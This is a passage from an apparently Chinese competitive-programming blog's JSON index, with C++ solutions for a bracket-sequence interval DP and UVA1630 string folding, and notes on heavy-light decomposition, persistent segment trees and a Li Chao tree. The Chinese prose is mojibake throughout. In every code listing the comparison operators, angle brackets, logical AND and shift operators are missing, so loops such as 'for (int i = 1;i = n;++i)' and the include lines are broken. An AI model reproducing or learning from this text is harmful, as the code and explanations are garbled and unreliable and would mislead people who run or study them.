- 1,0} + dp_{i + 1,j - 1,2} + dp_{i + 1,j - 1,3}$ã€‚ç›¸ä¿¡å¤§å®¶è¯»åˆ°è¿™é‡Œä¼šæœ‰ä¸€ä¸ªç–‘é—®ï¼Œè‹¥ $i + 1 = j$ï¼Œé‚£ä¹ˆä¼šæœ‰ $i + 1 j - 1$ï¼Œå¯¼è‡´ç­”æ¡ˆå‡ºé”™ã€‚å¾ˆç®€å•ï¼Œç”±äº () ä¹Ÿåˆæ³•ï¼Œæ‰€ä»¥åªéœ€è¦è¿›è¡Œä¸€ä¸ªç‰¹åˆ¤å³å¯ã€‚ å¯¹äº SA çš„å½¢å¼ï¼Œç”±ä¸€æ®µ S å’Œ A ç»„æˆï¼Œä¸€æ¬¡è®¾ç½® $[i,j]$ çš„æ–­ç‚¹ $k$ æ¥è¿›è¡Œè½¬ç§»ã€‚è½¬ç§»æ–¹ç¨‹ä¸º $dp_{i,j,2} = \\sum_{k = i}^{r - 1} g_{i,k} \\times dp_{j + 1,r,2}$ã€‚åªæœ‰åœ¨ $[i,k]$ æ˜¯ S ä¸²æ—¶æ‰å¯ä»¥è¢«è½¬ç§»ï¼Œç”¨ä¹˜æ³•ä¾¿å¾ˆå¥½çš„è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ å¯¹äº AS çš„å½¢å¼å¤§è‡´ä¸ä¸Šä¸€ä¸ªç›¸åŒï¼Œè½¬ç§»æ–¹ç¨‹ä¸º $dp_{i,j,3} = \\sum_{k = i}^{r - 1} g_{k + 1,r} \\times dp_{i,k,3}$ã€‚ æœ€åæ˜¯ $dp_{i,j,0}$ çš„è½¬ç§»ã€‚$dp_{i,j,1}$ è‚¯å®šç¬¦åˆæƒ…å†µï¼Œä¹‹åéœ€è¦é€šè¿‡ä¸¤ä¸ªå°åŒºé—´æ¥å¾—åˆ°å¤§åŒºé—´ï¼Œä¹Ÿå°±æ˜¯ AB ä»¥åŠ ASB çš„æƒ…å†µï¼Œä½†æ˜¯éœ€è¦è€ƒè™‘åˆ°é‡å¤è®¡ç®—çš„æƒ…å†µã€‚ç›´æ¥ä»¤ A ä¸²å±äº (...) çš„æƒ…å†µï¼Œè¿™æ ·å°±èƒ½å»æ‰é‡å¤è®¡ç®—ï¼Œå› æ­¤æœ‰è½¬ç§»æ–¹ç¨‹ $dp_{i,j,0} = dp_{i,j,1} + \\sum_{k = i}^{r - 1} dp_{i,k,1} \\times (dp_{k + 1,r,0} + dp_{k + 1,r,2})$ã€‚ å› æ­¤æœ€åçš„æ—¶é—´å¤æ‚åº¦æ˜¯ $O(n^3)$ çš„ï¼Œä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 505;const int MOD = 1e9 + 7;int n,k;char str[MAX];ll dp[MAX][MAX][4];bool g[MAX][MAX];/*dp[l][r][0] åˆæ³•ç­”æ¡ˆ æœ€ç»ˆç­”æ¡ˆå³ä¸º dp[1][n][0] dp[l][r][1] (A) dp[l][r][2] SA dp[l][r][3] AS*/bool check (int x,int y);int main () scanf (%d%d%s,n,k,str + 1); for (int i = 1;i = n;++i) for (int j = i;j = n;++j) if (j - i + 1 k) break; bool ok = 1; for (int k = i;k = j;++k) if (str[k] != * str[k] != ?) ok = 0; if (ok) g[i][j] = 1;//ä»…ç”± * ç»„æˆä¸”ä¸è¶…è¿‡ k ä¸ª for (int i = 1;i = n;++i) for (int l = 1;l = n;++l) int r = l + i; if (r n) break; if (check (l,r))//æ‹¬å·åŒ¹é… if (l == r - 1) dp[l][r][1] = 1;//ç‰¹åˆ¤ else dp[l][r][1] += (g[l + 1][r - 1] + dp[l + 1][r - 1][0] + dp[l + 1][r - 1][2] + dp[l + 1][r - 1][3]) % MOD; dp[l][r][0] += dp[l][r][1]; dp[l][r][0] %= MOD,dp[l][r][1] %= MOD; for (int k = l;k r;++k) dp[l][r][2] += g[l][k] * dp[k + 1][r][0]; dp[l][r][3] += dp[l][k][0] * g[k + 1][r]; dp[l][r][0] += dp[l][k][1] * (dp[k + 1][r][0] + dp[k + 1][r][2]) % MOD;//å»é‡ æ‰€ä»¥æŠŠå‰é¢é‚£ä¸ªæ ‡è®°æˆ 1 for (int p = 0;p 4;++p) dp[l][r][p] %= MOD; printf (%lld ,dp[1][n][0]); return 0;bool check (int x,int y) return ((str[x] == ( || str[x] == ?) (str[y] == ) || str[y] == ?));","categories":["Solution"]},{"title":"é¢˜è§£ï¼šUVA1630 ä¸²æŠ˜å  Folding","path":"/2022/07/28/UVA1630/","content":"æœ¬é¢˜æ˜¯ P4302 [SCOI2003]å­—ç¬¦ä¸²æŠ˜å  çš„å¼ºåŒ–ç‰ˆã€‚ ä¸éš¾çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªåŒºé—´ dpï¼Œä»¤ dp[i][j] è¡¨ç¤ºåŒºé—´ $[l,r]$ çš„æœ€å°é•¿åº¦ã€‚è€ƒè™‘ä¸¤ç§æ“ä½œï¼š åˆå¹¶ä¸¤ä¸ªå°åŒºé—´åå˜ä¸ºä¸€ä¸ªå¤§åŒºé—´ å°†æŸä¸ªåŒºé—´è¿›è¡ŒæŠ˜å  ç¬¬ä¸€ä¸ªæ“ä½œï¼Œæ˜¾ç„¶å°±æ˜¯åŒºé—´ dp çš„å¥—è·¯æ–¹æ³•ï¼Œå³ï¼š for (int k = l;k r;++k) dp[l][r] = min (dp[l][r],dp[l][k] + dp[k + 1][r]); ç¬¬äºŒä¸ªæ“ä½œï¼Œå¯¹äºä¸€ä¸ª $[l,r]$ çš„å­—ç¬¦ä¸²ï¼Œè‹¥è¦è¢«æŠ˜å æˆé•¿åº¦ä¸º $k$ çš„å­—ç¬¦ä¸²ï¼Œåœ¨æ‰§è¡Œçš„æ—¶å€™éœ€è¦æ»¡è¶³ $1 \\le k \\le r - l + 1$ ä¸” $k \\mid r - l +1$ ä¸” $\\forall i \\in [l,r - k], str[i] = str[i + k]$ã€‚ç¬¦åˆè¦æ±‚ï¼Œåˆ™å¯ä»¥è½¬ç§» dp[l][r] = min (dp[l][r],2 + calc ((r - l + 1) / k) + dp[l][l + k - 1])ã€‚å…¶ä¸­çš„ $2$ å³ä¸¤ä¸ªæ‹¬å·çš„é•¿åº¦ï¼Œcalc (x) è®¡ç®—çš„æ˜¯é‡å¤æ¬¡æ•°è¡¨ç¤ºæˆå­—ç¬¦ä¸²æ—¶çš„ä½æ•°ï¼Œdp[l][l + k - 1] å³å¾ªç¯èŠ‚ã€‚ åœ¨å¾—åˆ°æœ€å°é•¿åº¦åï¼Œç”±äºéœ€è¦è¾“å‡ºåˆæ³•çš„æ–¹æ¡ˆï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ­¤åŸºç¡€ä¸Šè¿˜è¦è®°å½•ä¸€äº›æ–­ç‚¹çš„ä¿¡æ¯ï¼Œä»è€Œè¿›è¡Œæœç´¢ã€‚ç”¨ä¸¤ä¸ªæ•°ç»„åˆ†åˆ«è®°å½•ç¬¬ä¸€å’Œç¬¬äºŒç§çš„æ“ä½œçš„æ–­ç‚¹ï¼Œç¬¬ä¸€ç§æ“ä½œè®°å½•æ–­ç‚¹çš„ç¼–å·ï¼Œç¬¬äºŒç§æ“ä½œè®°å½•å¾ªç¯èŠ‚çš„é•¿åº¦ã€‚ç”±äºä¸€ä¸ªåŒºé—´çš„å¤„ç†åªè¿›è¡Œä¸€ç§æ“ä½œï¼Œæ‰€ä»¥åœ¨æ ‡è®°æ—¶è¦æŠŠå¦å¤–ä¸€ç§æ“ä½œçš„æ–­ç‚¹è®¾ä¸º $0$ã€‚ åœ¨é€’å½’æ—¶ï¼Œå¯¹äºä¸€ä¸ªåŒºé—´è‹¥ä¸¤ç§æ–­ç‚¹å‡ä¸å­˜åœ¨ï¼Œåˆ™ç›´æ¥è¾“å‡ºè¿™æ®µåŒºé—´ï¼›è‹¥æ˜¯ç¬¬ä¸€ç§æ“ä½œçš„æ–­ç‚¹ $k$ï¼Œåˆ™åˆ†åˆ«é€’å½’åŒºé—´ $[l,k]$ å’Œ $[k + 1,r]$ï¼›è‹¥æ˜¯ç¬¬äºŒç§ï¼Œåˆ™å…ˆè¾“å‡ºå·¦æ‹¬å·å’Œé‡å¤çš„æ¬¡æ•°ï¼Œé€’å½’å¾ªç¯èŠ‚çš„åŒºé—´ï¼Œåœ¨è¾“å‡ºå³æ‹¬å·å³å¯ã€‚ å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x,y) memset (x,y,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 105;const int MOD = 1e9 + 7;char str[MAX];int n,dp[MAX][MAX],cut[MAX][MAX],fold[MAX][MAX];void check (int l,int r,int k);int calc (int num);void dfs (int l,int r);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); while (scanf (%s,str + 1) != EOF) n = strlen (str + 1); init (dp,INF);init (cut,0);init (fold,0);//å¤šæµ‹æ¸…ç©ºï¼ for (int i = 1;i = n;++i) dp[1][i] = i,dp[i][i] = 1;//åˆå§‹åŒ– for (int i = 1;i = n;++i) for (int l = 1;l = n;++l) int r = i + l; if (r n) break; for (int k = 1;k = (r - l + 1) / 2;++k) check (l,r,k); for (int k = l;k r;++k) if (dp[l][k] + dp[k + 1][r] dp[l][r])//åŒºé—´åˆå¹¶ dp[l][r] = dp[l][k] + dp[k + 1][r]; cut[l][r] = k; fold[l][r] = 0; //printf (%d ,dp[1][n]);// æœ€å°æ“ä½œæ¬¡æ•° dfs (1,n); puts (); return 0;void check (int l,int r,int k) if ((r - l + 1) % k) return ; for (int i = l;i = r - k;++i) if (str[i] != str[i + k]) return ;//ä¸åˆæ³• int s = 2 + calc ((r - l + 1) / k) + dp[l][l + k - 1]; if (s dp[l][r]) dp[l][r] = s; cut[l][r] = 0; fold[l][r] = k;//å¾ªç¯æ¬¡æ•°çš„è®°å½• int calc (int num) int cnt = 0; while (num) num /= 10,++cnt; return cnt;void dfs (int l,int r) if (!cut[l][r] !fold[l][r]) for (int i = l;i = r;++i) printf (%c,str[i]);//ç›´æ¥è¾“å‡ºå³å¯ else if (cut[l][r]) dfs (l,cut[l][r]),dfs (cut[l][r] + 1,r);//åˆ†åˆ«é€’å½’ä¸¤ä¸ªåŒºé—´ else printf (%d(,(r - l + 1) / fold[l][r]); dfs (l,l + fold[l][r] - 1);//ç»§ç»­é€’å½’å¾ªç¯èŠ‚ printf ());","categories":["Solution"]},{"title":"ä¸€äº›å…³äºæ•°æ®ç»“æ„çš„æ‚è°ˆ","path":"/2022/07/24/Data Structure/","content":"æ ‘é“¾å‰–åˆ†P3384 ã€æ¨¡æ¿ã€‘è½»é‡é“¾å‰–åˆ†/æ ‘é“¾å‰–åˆ† ä½œç”¨ ç»´æŠ¤æ ‘ä¸Šè·¯å¾„çš„ç›¸å…³ä¿¡æ¯ã€‚ å¸¸ä¸çº¿æ®µæ ‘ç›¸ç»“åˆã€‚ æ€§è´¨ æ‰€æœ‰èŠ‚ç‚¹éƒ½å±äºä¸”ä»…å±äºä¸€æ¡é‡é“¾ï¼Œé‡é“¾å°†æ ‘å®Œå…¨å‰–åˆ†ã€‚ é‡é“¾ä¸å­æ ‘å†…çš„ $\\texttt{dfs}$ åºè¿ç»­ã€‚ã€è¿™ä¸€ä¸ªæ€§è´¨éå¸¸æœ‰ç”¨ã€‘ æ¯ä¸€æ¡è·¯å¾„æœ€å¤šè¢«æ‹†åˆ†æˆ $\\log n$ æ¡é‡é“¾ï¼ˆå‘ä¸‹ç»è¿‡ä¸€æ¡è½»è¾¹æ—¶ï¼Œå­æ ‘å¤§å°è‡³å°‘é™¤ä»¥ $2$ï¼‰ã€‚ ä¸€äº›å®šä¹‰ f[x] èŠ‚ç‚¹ $x$ çš„çˆ¶äº²ã€‚ sz[x] èŠ‚ç‚¹ $x$ å¯¹åº”çš„å­æ ‘å¤§å°ã€‚ dep[x] èŠ‚ç‚¹ $x$ çš„æ·±åº¦ï¼ˆå‡å®šç¼–å·ä¸º $r$ çš„èŠ‚ç‚¹æ·±åº¦ä¸º $1$ï¼‰ã€‚ dfn[x] èŠ‚ç‚¹ $x$ çš„ $\\texttt{dfs}$ åºã€‚ hson[x] èŠ‚ç‚¹ $x$ æ‰€å¯¹åº”çš„é‡å„¿å­ã€‚ top[x] èŠ‚ç‚¹ $x$ æ‰€åœ¨çš„é‡é“¾çš„é¡¶éƒ¨èŠ‚ç‚¹ã€‚ rk[x] $\\texttt{dfs}$ åºæ‰€å¯¹åº”çš„èŠ‚ç‚¹ç¼–å·ï¼Œå³ rk[dfn[x]] = xã€‚ ä¸¤ä¸ª $\\texttt{dfs}$ ç¬¬ä¸€ä¸ªåˆ†åˆ«æ±‚å‡º fa[x] sz[x] dep[x] hson[x]ã€‚ å…·ä½“ä»£ç å¦‚ä¸‹ ï¼š void dfs1 (int u,int fa) sz[u] = 1; dep[u] = dep[fa] + 1; f[u] = fa; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v == fa) continue; dfs1 (v,u); sz[u] += sz[v]; if (sz[hson[u]] sz[v]) hson[u] = v;//å­å—å¤§çš„ä¾¿æ˜¯é‡å„¿å­ ç¬¬äºŒä¸ªåˆ†åˆ«æ±‚å‡º top[x] dfn[x] rk[x]ã€‚ å…·ä½“ä»£ç å¦‚ä¸‹ ï¼š void dfs2 (int u,int fa) if (hson[u]) top[hson[u]] = top[u]; dfn[hson[u]] = ++cnt; rk[cnt] = hson[u]; dfs2 (hson[u],u);//ä¼˜å…ˆå¯¹é‡å„¿å­è¿›è¡Œå‰–åˆ†ï¼Œä»è€Œä¿è¯é‡é“¾ä¸Šçš„ dfn åºè¿ç»­ for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v == fa || top[v]) continue; top[v] = v;//å•ç‹¬ä»¥ v ä½œä¸ºé‡é“¾çš„é¡¶ç«¯ dfn[v] = ++cnt; rk[cnt] = v; dfs2 (v,v); æ ‘ä¸Šä¸¤ç‚¹è·¯å¾„æƒå€¼å’Œçš„ä¿®æ”¹ä¸æŸ¥è¯¢ æ¯æ¬¡é€‰æ‹©æ·±åº¦å¤§çš„é“¾å¾€ä¸Šè·³ï¼Œç›´åˆ°ä¸¤ç‚¹åœ¨åŒä¸€æ¡é“¾ä¸Šã€‚ç”±äºé“¾ä¸Šçš„ $\\texttt{dfn}$ è¿ç»­ï¼Œæ‰€ä»¥ç›´æ¥å†ç”¨çº¿æ®µæ ‘ï¼ˆæˆ–æ ‘çŠ¶æ•°ç»„ï¼‰è¿›è¡Œç»´æŠ¤å³å¯ã€‚ ä»¥æŸ¥è¯¢ä¸ºä¾‹ ï¼š void upd (int x,int y,int v)// x - y çš„æœ€çŸ­è·¯å¾„ä¸Šï¼Œæ‰€æœ‰ç‚¹çš„æƒå€¼å‡åŠ ä¸Š v int fx = top[x],fy = top[y]; while (fx != fy) if (dep[fx] dep[fy]) swap (fx,fy),swap (x,y);//é€‰æ‹©æ·±åº¦å¤§çš„å‘ä¸Šè·³ modify (1,1,cnt,dfn[fx],dfn[x],v);//æŸä¸€æ®µé“¾çš„æ›´æ–° æ³¨æ„ f[x] çš„ dfn åºæ›´å° x = f[fx],fx = top[x]; if (dep[x] dep[y]) swap (x,y); modify (1,1,cnt,dfn[x],dfn[y],v);//æœ€å x ä¸ y åœ¨åŒä¸€æ¡é“¾ä¸Š å®Œæ•´ä»£ç  äº‘å‰ªè´´æ¿ æ‹“å±•åº”ç”¨ æ±‚æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚ä¸æ–­å‘ä¸Šè·³é‡é“¾ï¼Œå½“è·³åˆ°åŒä¸€æ¡é‡é“¾ä¸Šæ—¶ï¼Œæ·±åº¦è¾ƒå°çš„ç»“ç‚¹å³ä¸º $\\texttt{LCA}$ã€‚ æ ¸å¿ƒä»£ç å°±æ˜¯ä¸Šä¸€æ¨¡æ¿é¢˜çš„æŸ¥è¯¢æ“ä½œçš„ä¿®æ”¹ã€‚ int LCA (int x,int y) int fx = top[x],fy = top[y]; while (fx != fy) if (dep[fx] dep[fy]) swap (fx,fy),swap (x,y); x = f[fx],fx = top[x]; if (dep[x] dep[y]) swap (x,y); return x; å¯æŒä¹…åŒ–çº¿æ®µæ ‘P3919 ã€æ¨¡æ¿ã€‘å¯æŒä¹…åŒ–çº¿æ®µæ ‘ 1ï¼ˆå¯æŒä¹…åŒ–æ•°ç»„ï¼‰ ä½œç”¨ å¯ä¿ç•™æ¯ä¸€ä¸ªå†å²ç‰ˆæœ¬ã€‚ å®ç°ä¸€äº›å¼ºåˆ¶åœ¨çº¿çš„åŠŸèƒ½ã€‚ æ€§è´¨ æ¯ä¸€æ¬¡ä¿®æ”¹åæ‰€å¢åŠ çš„èŠ‚ç‚¹æ•°æœ€å¤§ä¸º $\\log n$ã€‚ å…·æœ‰è‹¥å¹²ä¸ªæ ¹ï¼Œä¸”æ¯ä¸€ä¸ªæ ¹å‡å¯ä»¥æ„æˆä¸€æ£µå®Œæ•´çš„çº¿æ®µæ ‘ã€‚ å®ç°è¿‡ç¨‹ åªå¯¹è¿›è¡Œä¿®æ”¹çš„ç»“ç‚¹è¿›è¡Œå¤åˆ¶å¤„ç†ã€‚ ç›´æ¥æ–°å¼€ä¸€å—å†…å­˜å‚¨å­˜æ–°èŠ‚ç‚¹ï¼Œå»ºæ ‘ç­‰åŒäºæ–°å»ºèŠ‚ç‚¹ã€‚ å¯¹äºæ¯ä¸€ä¸ªæ ¹ï¼Œå¯¹åº”ç€ä¸€ä¸ªç‰ˆæœ¬ï¼Œå› æ­¤è‹¥è¦å¤„ç†æŸä¸€ç‰ˆæœ¬ $i$ï¼Œè®¿é—®æˆ–æ›´æ–°æ—¶ç›´æ¥ä½¿ç”¨ root[i] å³å¯ã€‚ å…¶å®ƒè¿‡ç¨‹ä¸æ™®é€šçº¿æ®µæ ‘å·®ä¸å¤šã€‚ æ³¨æ„ç©ºé—´å¼€åˆ° N 5 å·®ä¸å¤šã€‚ å®Œæ•´ä»£ç  #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,cnt,a[MAX],root[MAX 5];struct node int dl,dr,v; tree[MAX 5]; int make (int cur,int l,int r);int modify (int cur,int l,int r,int x,int val);int query (int cur,int l,int r,int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) a[i] = read (); root[0] = make (0,1,n);//åˆå§‹çš„å»ºæ ‘è¿‡ç¨‹ for (int i = 1;i = m;++i) int k = read (),ty = read (),x = read (),y; if (ty == 1) y = read (); root[i] = modify (root[k],1,n,x,y); else printf (%d ,query (root[k],1,n,x)); root[i] = root[k];//ä¿å­˜å½“å‰ç‰ˆæœ¬ return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int make (int cur,int l,int r) cur = ++cnt; if (l == r) tree[cur].v = a[l]; return cur; int mid = (l + r) 1; tree[cur].dl = make (tree[cur].dl,l,mid); tree[cur].dr = make (tree[cur].dr,mid + 1,r); return cur;int modify (int cur,int l,int r,int x,int val) tree[++cnt] = tree[cur];//æ–°å¼€ä¸€ä¸ªèŠ‚ç‚¹ cur = cnt; if (l == r) tree[cur].v = val; return cur; int mid = (l + r) 1; if (x = mid) tree[cur].dl = modify (tree[cur].dl,l,mid,x,val); else tree[cur].dr = modify (tree[cur].dr,mid + 1,r,x,val); return cur;int query (int cur,int l,int r,int x) if (l == r) return tree[cur].v; int mid = (l + r) 1; if (x = mid) return query (tree[cur].dl,l,mid,x); else return query (tree[cur].dr,mid + 1,r,x); P3834 ã€æ¨¡æ¿ã€‘å¯æŒä¹…åŒ–çº¿æ®µæ ‘ 2 åŒ P1533 å¯æ€œçš„ç‹—ç‹— å’Œä¸Šé¢˜å·®ä¸å¤šï¼Œç”¨ root[i] è¡¨ç¤ºèŒƒå›´ä¸º $[1,i]$ çš„ä¸€ä¸ªç‰ˆæœ¬ï¼ŒæŸ¥è¯¢æ—¶ç”¨å‰ç¼€å’Œçš„æ€æƒ³è¿›è¡Œçº¿æ®µæ ‘çš„ç›¸å‡ã€‚ å³åœ¨æ±‚ç¬¬ $k$ å°çš„æ•°æ—¶ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦åœ¨å·¦å­æ ‘å†…ï¼Œæ˜¯åˆ™é€’å½’ï¼›å¦åˆ™é€’å½’å³å­æ ‘å¹¶å°†é—®é¢˜å˜ä¸ºæ±‚ç¬¬ $k - x$ å°çš„æ•°ï¼ˆ$x$ è¡¨ç¤ºè¿›è¡Œç›¸å‡åçš„åŒºé—´çš„æ•°çš„ä¸ªæ•°ï¼‰ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct T int l,r,sum; tree[MAX 5];int n,m,len,cnt,a[MAX],num[MAX],root[MAX]; int build (int cur,int l,int r);int modify (int cur,int l,int r,int x);int query (int l,int r,int dx,int dy,int k);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) a[i] = read (),num[i] = a[i]; sort (num + 1,num + 1 + n); len = unique (num + 1,num + n + 1) - num - 1; root[0] = build (1,1,len); for (int i = 1;i = n;++i) int x = lower_bound (num + 1,num + 1 + len,a[i]) - num; root[i] = modify (root[i - 1],1,len,x); for (int i = 1;i = m;++i) int x = read (),y = read (),k = read (); printf (%d ,num[query (1,len,root[x - 1],root[y],k)]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int build (int cur,int l,int r) cur = ++cnt; if (l == r) return cur; int mid = (l + r) 1; tree[cur].l = build (tree[cur].l,l,mid); tree[cur].r = build (tree[cur].r,mid + 1,r); return cur;int modify (int cur,int l,int r,int x) tree[++cnt] = tree[cur]; tree[cnt].sum = tree[cur].sum + 1; cur = cnt; if (l == r) return cur; int mid = (l + r) 1; if (x = mid) tree[cur].l = modify (tree[cur].l,l,mid,x); else tree[cur].r = modify (tree[cur].r,mid + 1,r,x); return cur; int query (int l,int r,int dx,int dy,int k) if (l == r) return l; int x = tree[tree[dy].l].sum - tree[tree[dx].l].sum;//çº¿æ®µæ ‘ç›¸å‡ int mid = (l + r) 1; if (x = k) return query (l,mid,tree[dx].l,tree[dy].l,k); // å·¦å­æ ‘èƒ½åŒ…å«ç¬¬ k å° else return query (mid + 1,r,tree[dx].r,tree[dy].r,k - x); æè¶…çº¿æ®µæ ‘P4097 [HEOI2013]Segment æ”¯æŒåŒºé—´åŠ å…¥ä¸€æ¡å¹³é¢ä¸Šçš„çº¿æ®µï¼Œå•ç‚¹è¯¢é—®å‡½æ•°æœ€å€¼ï¼Œç”¨ä¸€æ¬¡å‡½æ•°çš„å½¢å¼å‚¨å­˜çº¿æ®µã€‚ æœ‰ä¸¤ç§æ“ä½œï¼š åŠ å…¥ä¸€ä¸ªå€¼åŸŸä¸º $[l,r]$ çš„ä¸€æ¬¡å‡½æ•° ç»™å®š $k$ åæ±‚ä¸ $x = k$ ç›¸äº¤æ—¶ $y$ æœ€å¤§çš„çº¿æ®µç¼–å·ï¼ˆç›¸åŒæ—¶æŒ‰ç…§å­—å…¸åºï¼‰ æ‹¿æ–°çº¿æ®µåœ¨ä¸­ç‚¹å¤„çš„å€¼ä¸åŸæœ€ä¼˜çº¿æ®µåœ¨ä¸­ç‚¹å¤„çš„å€¼ä½œæ¯”è¾ƒï¼Œæ‹©ä¼˜é€‰å–ã€‚ä¸»è¦å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§æƒ…å†µï¼š ä¹‹å‰æ²¡æœ‰çº¿æ®µï¼Œåˆ™æ–°çº¿æ®µä¸ºæœ€ä¼˜è§£ã€‚ æ–°çº¿æ®µå®Œå…¨ä¼˜äºåŸçº¿æ®µï¼Œç›´æ¥æ›´æ–°æ•´æ®µã€‚ æ–°çº¿æ®µå®Œå…¨åŠ£äºåŸçº¿æ®µï¼Œç›´æ¥å¿½ç•¥ã€‚ æ–°çº¿æ®µä¸åŸçº¿æ®µæœ‰äº¤ç‚¹ï¼Œç»§ç»­è¿›è¡Œåˆ†ç±»è®¨è®ºï¼Œä¸¤ç§æƒ…å†µç»§ç»­å¯¹åº”æ›´æ–°å·¦å³å­åŒºé—´çš„ä¸¤ç§æƒ…å½¢ï¼š äº¤ç‚¹åœ¨ä¸­ç‚¹ä¸­é—´åŠå·¦ä¾§ äº¤ç‚¹åœ¨ä¸­ç‚¹å³ä¾§ åœ¨å†™æ³•ä¸Šå¤§è‡´ä¸æ™®é€šçº¿æ®µæ ‘ç›¸åŒï¼Œä½†æ˜¯æœ‰å‡ ä¸ªç»†èŠ‚éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼š å¯¹äºä¸€æ¡çº¿æ®µï¼Œå¦‚æœç›´æ¥ç”¨ç‚¹æ–œå¼è¡¨ç¤ºï¼Œæ–œç‡å¯èƒ½ä¸å­˜åœ¨ï¼ˆä½†ç”±é¢˜çŸ¥ä¸ä¼šä¸º $0$ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥ç‰¹åˆ¤æ­¤æƒ…å†µå°†å…¶æ ‡è®°ä¸º $0$ã€‚ è¾“å…¥æ—¶éœ€è¦è°ƒæ•´ä¸¤ç«¯ç‚¹çš„ä½ç½®ï¼Œç¡®ä¿ $x_0 x_1$ ä»è€Œæ–¹ä¾¿è®¡ç®—ã€‚ åœ¨æ›´æ–°æœ€ä¼˜å­åŒºé—´æ—¶ç›¸å½“äºæ ‡è®°ä¸‹æ”¾ï¼Œåœ¨æ­¤å› å‡å°‘åˆ†ç±»è®¨è®ºé‡é»˜è®¤ä¸ºå½“å‰æœ€ä¼˜å­åŒºé—´çš„ä¸­ç‚¹å°äºæ–°åŠ å…¥çš„çº¿æ®µï¼Œè‹¥ä¸ç¬¦åˆå¼ºåˆ¶äº¤æ¢ä¸€ä¸‹ï¼Œç„¶ååœ¨æ­¤åŸºç¡€ä¸Šæ›´æ–°å·¦åŒºé—´æˆ–å³åŒºé—´ã€‚ è‹¥ä¸å­˜åœ¨ä»»ä½•ä¸€æ¡çº¿æ®µä¸æŸ¥è¯¢ç›´çº¿æœ‰äº¤ï¼Œåˆ™è¾“å‡º $0$ï¼›è‹¥æœ‰å¤šæ¡çº¿æ®µä¸æŸ¥è¯¢ç›´çº¿çš„äº¤ç‚¹çºµåæ ‡éƒ½æ˜¯æœ€å¤§çš„ï¼Œåˆ™è¾“å‡ºç¼–å·æœ€å°çš„çº¿æ®µã€‚ä»¥ä¸Šä¸ºè¾“å‡ºçš„è¦æ±‚ï¼Œå¯¹äºä¸ç›¸äº¤çš„çº¿æ®µï¼Œç‰¹åˆ¤ä¸€ä¸‹å³å¯ï¼›è€Œå¯¹äºè¾“å‡ºç­”æ¡ˆçš„æ–¹å¼ï¼Œå†™ä¸€ä¸ªå‡½æ•°è¿›è¡Œæ¯”è¾ƒï¼Œçºµåæ ‡ç›¸åŒæ—¶æ¯”è¾ƒç¼–å·ï¼Œå¦åˆ™æ¯”è¾ƒçºµåæ ‡å³å¯ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD1 = 39989,MOD2 = 1e9 + 1;inline int read ();struct line double num; int id;;struct node double k,b; a[MAX];int t,ans,cnt,root[MAX 2];line cmp (line x,line y);double calc (int cur,int x);void add (int sx,int sy,int fx,int fy);void modify (int cur,int l,int r,int x,int y,int id);void pushdown (int cur,int l,int r,int id);line query (int cur,int l,int r,int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) bool ty = read (); if (!ty) int k = read (); ans = query (1,1,MOD1,(ans + k - 1) % + MOD1 + 1).id; printf (%d ,ans); else int sx = read (),sy = read (),fx = read (),fy = read (); sx = (ans + sx - 1) % MOD1 + 1;fx = (ans + fx - 1) % MOD1 + 1; sy = (ans + sy - 1) % MOD2 + 1;fy = (ans + fy - 1) % MOD2 + 1; if (sx fx) swap (sx,fx),swap (sy,fy); add (sx,sy,fx,fy); modify (1,1,MOD1,sx,fx,cnt); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;line cmp (line x,line y) if (x.num != y.num) return x.num y.num ? y : x; else return x.id y.id ? x : y;double calc (int cur,int x) return a[cur].k * x + a[cur].b;void add (int sx,int sy,int fx,int fy)// å·²ç»ä¿è¯ sx fx ++cnt; if (sx == fx) a[cnt] = 0,max (sy,fy);// å‚ç›´ä¸ x è½´æ—¶æ–œç‡ä¸å­˜åœ¨ else a[cnt].k = (double)(fy - sy) / (fx - sx); a[cnt].b = sy - 